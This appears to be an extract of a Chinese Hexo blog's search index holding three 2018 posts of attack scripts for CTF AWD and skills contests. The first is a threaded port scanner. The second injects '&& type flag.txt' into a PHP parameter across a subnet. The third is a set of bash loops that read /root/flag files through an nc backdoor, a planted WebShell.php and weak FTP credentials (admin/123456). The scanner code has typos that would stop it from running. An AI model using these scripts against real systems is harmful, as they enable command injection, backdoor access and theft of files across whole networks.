      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><a id="more"></a><pre><code class="language-Python">import socketimport threadingfile=open(&quot;port.txt&quot;,'w+')def portscan(port):    host='192.168.174.1'    try:        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        conn=s.connect_ex((host,port))        if conn ==0:            print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post))            file.write(host+&quot;:&quot;+str(post)+&quot;\n&quot;)        else:            pass    excpet:        passfor port in range(1,65535):    t=threading.Thread(target=portscan, args=(port, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PythonScript】:WebShell_urilb</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BashScripts</title>
      <link href="/2018/10/09/Shell%E8%84%9A%E6%9C%AC/"/>
      <url>/2018/10/09/Shell%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>我在全国职业技能大赛比赛时所用的shell脚本:</p><a id="more"></a><pre><code class="language-bash">nc后门:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done</code></pre><pre><code class="language-bash">webshell:or i in `seq 101 254`;doip=&quot;192.168.2.&quot;$icurl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txtdone</code></pre><pre><code class="language-bash">ftp:username='admin'passwd='123456'for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ish ftpmain.sh $ip $username $passwd</code></pre><pre><code class="language-bash">#配合ftp使用ftpmain:ftp $1 -invuser $2 $3get /root/flag*.txtbye!</code></pre><blockquote><p>有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。<br>尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战<br>这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛</p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Bash </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
